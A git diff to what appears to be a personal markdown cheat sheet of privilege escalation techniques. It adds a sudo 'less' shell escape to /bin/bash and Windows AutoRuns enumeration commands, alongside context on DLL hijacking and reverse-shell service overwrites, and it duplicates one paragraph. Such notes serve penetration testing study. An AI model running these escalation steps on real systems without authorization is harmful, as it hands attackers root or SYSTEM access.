@@ -110,6 +110,17 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 
 ## Linux Privilege Escalation
 
+### SUDO
+sudo is very dangerous. 
+### sudo in more and less
+```bash
+sudo -l 
+(ALL) /usr/bin/less
+
+sudo less /var/log/kern.log
+:!/bin/bash
+```
+
 #### SUID /bin/systemctl
 create revshell.service as:
 ```bash
@@ -475,6 +486,9 @@ Copy the reverse shell executable to overwrite the service executable:
 
 ### 5. DLL Hijacking
 A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.
+A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the
+PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.
+
 ```bash
 Use winPEAS to enumerate non-Windows services:
 > .\winPEASany.exe quiet servicesinfo
@@ -498,6 +512,23 @@ FOUND” errors appear, associated with the hijackme.dll file.
 > net start dllsvc
 
 ```
+
+## AutoRuns
+### AutoRuns
+Windows can be configured to run commands at startup, with elevated privileges.
+These “AutoRuns” are configured in the Registry.
+
+If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
+```bash
+1. Use winPEAS to check for writable AutoRun executables:
+> .\winPEASany.exe quiet applicationsinfo
+2. Alternatively, we could manually enumerate the AutoRun executables:
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+and then use accesschk.exe to verify the permissions on each one:
+> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+```
+
 
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
